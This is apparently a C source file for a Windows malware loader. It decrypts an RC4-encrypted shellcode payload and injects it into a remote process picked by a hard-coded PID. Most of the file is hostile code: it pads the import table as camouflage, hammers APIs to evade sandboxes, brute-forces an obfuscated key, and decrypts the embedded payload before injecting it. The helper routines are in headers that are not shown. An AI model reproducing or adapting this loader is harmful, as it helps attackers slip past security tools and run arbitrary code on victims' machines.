#include <Windows.h>

#include "include/SysWhispers.h"
#include "include/common.h"
#include "include/debug.h"

// Set the remote process PID
#define PROCESS_ID 19360

// Encrypted key
unsigned char ProtectedKey[] = {
    0xD1, 0xF6, 0x7C, 0x89, 0x71, 0x8C, 0xF2, 0x89, 0xB6, 0xFC, 0x1F, 0x07, 0xFE, 0x82, 0x56, 0x66,
    0x95, 0xD2, 0x45, 0x1B, 0x9E, 0x4A, 0xFD, 0x88, 0x7E, 0x14, 0x3A, 0x9F, 0x77, 0x50, 0x19, 0xD9
};

// Encrypted RC4 shellcode payload
unsigned char Rc4EncryptedPayload[] = {
    0x44, 0x3C, 0x18, 0x73, 0xCA, 0x86, 0x68, 0x08, 0xBC, 0xCD, 0x2D, 0x59, 0x39, 0x22, 0x3C, 0xFF,
    0x6A, 0x87, 0xA0, 0xF9, 0x69, 0xB4, 0x49, 0x95, 0x3A, 0xF7, 0x79, 0x24, 0x57, 0x7D, 0xC6, 0x31,
    0xD1, 0xB4, 0x68, 0xC7, 0x5D, 0x88, 0xFF, 0x90, 0x2C, 0x1A, 0xB3, 0xB3, 0xB3, 0xD5, 0x8E, 0xD0,
    0x31, 0x8C, 0x11, 0x1E, 0x51, 0x12, 0xC6, 0x32, 0x27, 0x8F, 0x34, 0x56, 0x49, 0x15, 0xBE, 0xE9,
    0xDB, 0xA9, 0xD7, 0x44, 0x66, 0x87, 0x79, 0x07, 0x94, 0x04, 0xB0, 0x74, 0x96, 0x4A, 0x09, 0x3B,
    0xAA, 0xBF, 0xEE, 0x0D, 0xEC, 0x2D, 0x6B, 0xD9, 0x01, 0xCE, 0xBE, 0x4D, 0xA9, 0x3C, 0x78, 0x93,
    0x62, 0xFE, 0x5E, 0x69, 0x47, 0x54, 0xAE, 0xD1, 0x0F, 0xC3, 0xAF, 0xA6, 0xE8, 0xF2, 0xFA, 0x02,
    0x08, 0xD8, 0xDA, 0x42, 0xD7, 0x62, 0x31, 0xC8, 0x1E, 0x5E, 0x11, 0x2A, 0xB0, 0x82, 0xB5, 0x0B,
    0x15, 0xC3, 0x36, 0xD2, 0x36, 0xA8, 0x1B, 0x88, 0x2C, 0x3F, 0x4D, 0xDE, 0x5F, 0x19, 0x17, 0xF6,
    0xE8, 0x30, 0x16, 0x6C, 0x64, 0x7B, 0x5E, 0xD4, 0x45, 0x93, 0x76, 0x47, 0x86, 0xE2, 0x19, 0xEA,
    0x62, 0x64, 0x17, 0xBE, 0x0A, 0x0D, 0x66, 0xF9, 0x3A, 0xB7, 0xD0, 0xFD, 0xE4, 0x90, 0xA5, 0xB1,
    0x04, 0xAD, 0x6E, 0x9E, 0xA6, 0x81, 0xFC, 0xBA, 0x08, 0x30, 0x56, 0x86, 0x34, 0xC3, 0xE6, 0x2D,
    0xA3, 0x90, 0x93, 0x13, 0xD7, 0xD3, 0x7D, 0x0C, 0xCB, 0x6F, 0xA4, 0xE0, 0xAA, 0x19, 0x77, 0x4F,
    0xB6, 0x2A, 0xEA, 0xA0, 0xDD, 0x0C, 0x57, 0x1F, 0x93, 0x08, 0x0D, 0x1B, 0x29, 0x79, 0x62, 0x00,
    0xCC, 0xE3, 0x6B, 0xF2, 0xD6, 0x71, 0xC6, 0x80, 0x0A, 0x4B, 0x68, 0xD1, 0xBA, 0xDC, 0x86, 0x8D,
    0x3C, 0x6E, 0xAA, 0xAC, 0xBE, 0x3E, 0x66, 0xD9, 0x2E, 0x94, 0x8C, 0x71, 0x00, 0x94, 0x13, 0xE2,
    0xCC, 0xDF, 0x98, 0x32, 0xD7, 0x9D, 0x5B, 0xAD, 0xFB, 0x21, 0x6A, 0xF4, 0x88, 0x16, 0x0B, 0xEF
};

int main() {

    // Filling the IAT
    Camo();

    // API hammering
    ApiHammering(3000);

    // Open the remote process
    HANDLE hProcess = OpenProc(PROCESS_ID);
    if (hProcess == NULL) {
        PRINTA("[ERROR] Unable to open process %d.\n", PROCESS_ID);
        return -1;
    }

    // Bruteforce the decryption key
    PBYTE pRealKey = NULL;
    if (!BruteForceDecryption(HINT_BYTE, ProtectedKey, sizeof(ProtectedKey), &pRealKey)) {
        return -1;
    }

    // Decrypt the shellcode
    if (!Rc4EncryptionViSystemFunc032(pRealKey, Rc4EncryptedPayload, sizeof(ProtectedKey), sizeof(Rc4EncryptedPayload))) {
        return -1;
    }

    // Inject the decrypted shellcode
    if (!InjectShellcode(hProcess, Rc4EncryptedPayload, sizeof(Rc4EncryptedPayload))) {
        return -1;
    }

    return 0;
}
